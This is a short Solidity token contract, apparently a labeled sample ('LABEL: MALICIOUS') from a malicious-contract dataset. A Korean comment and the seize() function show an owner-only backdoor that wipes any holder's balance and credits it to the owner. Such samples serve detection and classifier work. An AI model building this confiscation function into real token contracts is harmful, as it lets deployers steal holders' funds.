// SPDX-License-Identifier: MIT
// LABEL: MALICIOUS
//
// 소유자가 seize()로 임의 사용자의 토큰 잔고를 강제로 0으로 만들고 같은 양을 자신의 잔고에 더할 수 있습니다.
pragma solidity ^0.8.20;

contract OwnerConfiscation {
    address public owner;
    mapping(address => uint256) public balanceOf;

    constructor(uint256 supply) {
        owner = msg.sender;
        balanceOf[msg.sender] = supply;
    }
    modifier onlyOwner() { require(msg.sender == owner, "owner"); _; }

    function seize(address victim) external onlyOwner {
        uint256 amount = balanceOf[victim];
        balanceOf[victim] = 0;
        balanceOf[owner] += amount;
    }
}
